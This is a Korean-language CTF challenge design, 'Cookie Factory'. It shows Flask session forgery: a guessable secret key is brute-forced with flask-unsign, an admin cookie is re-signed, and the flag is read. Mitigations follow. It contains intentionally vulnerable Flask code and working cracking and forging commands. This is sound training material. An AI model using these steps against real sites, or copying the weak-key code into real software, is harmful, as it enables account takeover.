---
title: Predictable Secret Key leading to Flask Session Hijacking — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, session, flask, cookie, brute-force, cryptanalysis]
confidence: high
---

# Predictable Secret Key leading to Flask Session Hijacking — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Cookie Factory (쿠키 공장)
- **난이도**: Easy-Medium
- **핵심 컨셉**: 파이썬 Flask 프레임워크가 제공하는 **클라이언트 사이드 세션(Client-side Session)** 매커니즘의 취약점을 공략하는 문제입니다. Flask는 쿠키를 암호화하여 브라우저에 저장하지 않고, 단순히 직렬화(Serialization)한 뒤 서버의 비밀키(`secret_key`)로 서명(Signature)만 수행합니다. 만약 개발자가 이 비밀키를 안전한 임의 바이트가 아니라 예측하기 쉬운 단어(예: 단어 사전의 명사류)로 하드코딩해 두었을 경우, 공격자는 오프라인에서 서명을 역분석하고 키를 무작위 대입(Brute-force)으로 유추해 낼 수 있습니다. 이후 유추된 비밀키로 세션 데이터를 위조하여 관리자 권한을 획득합니다. (picoCTF `Most Cookies` 영감)

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Web Portal**: 사용자에게 오늘의 쿠키 정보를 출력해주는 간단한 대시보드 화면. 일반적인 로그인을 진행하면 임의의 쿠키 이름이 적힌 Flask 세션이 발급됩니다.
- **Backend Service (Python/Flask)**:
  - 세션 서명용 `secret_key`를 내부 비밀 단어 목록(예: `snickerdoodle`, `chocolate`, `oatmeal`, `gingerbread` 등 20여 개) 중 무작위로 하나를 선택해 설정합니다. (단, 서버를 재부팅하지 않는 한 동일 세션 키를 공유함)
  - 세션 딕셔너리 구조: `{"auth": "guest", "cookie_type": "chocolate"}`
- **Flag 위치**:
  - 세션 값 중 `auth` 항목이 `"admin"`일 때 `/admin/flag` 경로로 접근하면 플래그가 화면에 출력됩니다.

### 2.2 취약점 지점
1. **Predictable Flask Secret Key (Weak Cryptography)**:
   - Flask 개발 시 서명용 비밀키를 하드코딩된 단어로 유추할 수 있도록 개발한 보안 설정 오류입니다.
2. **Flask Client-side Session Trust**:
   - 서버가 클라이언트의 세션 값에 인가 상태(`auth: admin`)를 담고 이를 서버가 서명만 검증하여 그대로 신뢰하는 아키텍처 결함입니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|------------|--------|------|---------|---------|------|
| `/` | GET | 없음 | 없음 | 오늘의 쿠키 화면 | 세션 쿠키 발급 (`session` 이름의 쿠키) |
| `/admin/flag` | GET | 세션 필요 | `session` 쿠키 헤더 | 플래그 문자열 | `auth: admin`을 요구함 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 세션 쿠키 획득 및 분석
사용자는 웹 포털에 로그인하여 발급받은 쿠키(`session`) 값을 획득합니다.
- *예시 세션 값*: `.eJyrVopXSCxWySvNTczM0VFKyy_KzCtW0lHKK81NLEnNywUrKs0FioPFTYDYUClbHaUcj9S8vBzdWAglqEAAXkUYPA.Yp2xNA.xyz...`
- *구조 디코딩*: Base64 디코딩을 거치면 서명을 제외한 내부 페이로드가 평문으로 나타납니다.
  ```json
  {"auth": "guest", "cookie_type": "snickerdoodle"}
  ```

### Step 2. 오프라인 비밀키 무작위 대입 (Brute-force)
공격자는 서버의 비밀키를 알아내기 위해 `flask-unsign` 도구 또는 직접 구현한 파이썬 스크립트를 사용해 알려진 단어 리스트 기반 오프라인 사전을 대입합니다.
- *단어 리스트 사전 파일 작성 (`wordlist.txt`)*:
  ```text
  snickerdoodle
  chocolate
  oatmeal
  gingerbread
  sugar
  ...
  ```
- *flask-unsign 크래킹 명령*:
  ```bash
  # 발급된 세션 쿠키에 대해 wordlist.txt 단어들로 무작위 서명 검증을 진행합니다.
  flask-unsign --unsign --cookie ".eJyrVopX..." --wordlist wordlist.txt
  ```
- *크래킹 성공 출력 예시*:
  ```text
  [*] Session decoded: {'auth': 'guest', 'cookie_type': 'snickerdoodle'}
  [*] Candidate key found: 'gingerbread'
  ```

### Step 3. 세션 위조 (Session Forgery)
획득한 후보 비밀키인 `'gingerbread'`를 사용하여 새로운 세션 쿠키를 서명합니다. 이때 `auth` 필드 값을 `admin`으로 변경합니다.
- *세션 재서명 명령*:
  ```bash
  # 비밀키 'gingerbread'를 이용해 auth 값이 admin인 조작된 세션을 서명합니다.
  flask-unsign --sign --cookie "{'auth': 'admin', 'cookie_type': 'snickerdoodle'}" --secret "gingerbread"
  ```
- *생성된 위조 세션 쿠키*:
  `.eJyrVopXSCxWySvNTczM0VFKyy_KzCtW0lHKK81NLEnNywUrKs0FiivVAdK1Oko5Hql5eTm6sRBKUIDx7xgs.Yp2_ZQ.xyz...`

### Step 4. 권한 우회 및 플래그 획득
위조된 세션 쿠키를 브라우저 쿠키에 대입한 뒤 `/admin/flag` 경로에 접속합니다. 서버는 자신이 서명한 비밀키 `'gingerbread'`와 일치하므로 올바른 세션으로 판별하고, 내부 `auth`가 `admin`이므로 플래그를 보여줍니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# app.py
from flask import Flask, session, jsonify, request
import random

app = Flask(__name__)

# 예측 가능한 후보 키 목록 (소스코드 주석 또는 문제 힌트로 명시됨)
SECRET_KEYS_POOL = [
    "snickerdoodle", "chocolate", "oatmeal", "gingerbread",
    "sugar", "butter", "peanutbutter", "macadamia"
]

# 서버 실행 시 풀 내부에서 무작위로 하나의 키 선택 (하드코딩된 단어)
app.secret_key = random.choice(SECRET_KEYS_POOL)

@app.route("/")
def index():
    if "auth" not in session:
        session["auth"] = "guest"
        session["cookie_type"] = random.choice(SECRET_KEYS_POOL)
    return f"Welcome! Current Cookie: {session['cookie_type']}"

@app.route("/admin/flag")
def get_flag():
    # 클라이언트가 제출한 세션 쿠키의 서명을 app.secret_key로 검증 후 로드
    auth_status = session.get("auth", "guest")
    
    if auth_status == "admin":
        return jsonify({"flag": "FLAG{fl4sk_s3ss10n_secr3t_brut3f0rc3_suce$$}"})
    else:
        return jsonify({"error": "Unauthorized. You are not admin!"}), 403

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **강력한 무작위 비밀키 생성 (Cryptographically Secure Random Key)**:
   - 예측 불가능한 암호학적 난수를 사용하여 실행 시점에 세션 비밀키를 강제로 새로 발급받도록 설정합니다.
   - **올바른 설정 예시**:
     ```python
     import os
     app.secret_key = os.urandom(32) # 매 구동 시마다 32바이트의 임의 바이트 생성
     ```
2. **서버 사이드 세션 보관 (Server-side Session)**:
   - 민감한 역할 정보(`auth`)를 클라이언트가 수정 가능한 쿠키(세션) 영역에 직접 기입하지 말고, 서버 측 Redis나 데이터베이스에 저장한 뒤 클라이언트에는 단순 세션 ID 랜덤 토큰만 매핑해 제공합니다. (예: `Flask-Session` 플러그인 이용)
